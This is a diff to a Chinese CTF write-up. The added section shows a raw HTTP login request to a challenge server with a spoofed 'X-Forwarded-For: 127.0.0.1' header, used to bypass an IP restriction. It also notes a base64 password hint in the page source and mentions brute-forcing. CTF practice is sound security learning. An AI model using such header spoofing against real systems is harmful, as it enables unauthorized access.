@@ -192,7 +192,34 @@ eval("var_dump($$args);");
 进入发现是一个登陆界面
 因为是管理员系统,推测用户名为 admin 
 随便输入密码提交,回显`IP禁止访问，请联系本地管理员登陆，IP已被记录.`
-本地管理员,联想到伪造 IP 地址(不要问我为什么,CTF 的脑洞ji)
+本地管理员,联想到伪造 IP 地址 ~~(不要问我为什么,CTF 的脑洞就是这么大)~~
+Burp 抓包,修改包
+```
+POST / HTTP/1.1
+Host: 123.206.31.85:1003
+Content-Length: 20
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36
+Origin: http://123.206.31.85:1003
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+X-Forwarded-For: 127.0.0.1 #伪造本地管理员IP
+Referer: http://123.206.31.85:1003/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+user=admin&pass=asdf
+```
+提交,回显
+`Invalid credentials! Please try again!`
+密码不对,可以选择爆破
+但查看网页源码发现 
+```php
+<!-- dGVzdDEyMw== -->
+```
 
 ## 求 Getshell
 后缀名黑名单检测和类型检测
@@ -201,6 +228,6 @@ eval("var_dump($$args);");
 ![](https://upload-images.jianshu.io/upload_images/9172841-0b4859adfbdad510.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/702/format/webp)
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE4NTIyMDI4NTAsLTEyMTkwNTUwMzksLT
+eyJoaXN0b3J5IjpbLTE3MTQzNDkzNDIsLTEyMTkwNTUwMzksLT
 E3NDUwOTI2MjgsLTQyODcyNTgwNF19
 -->
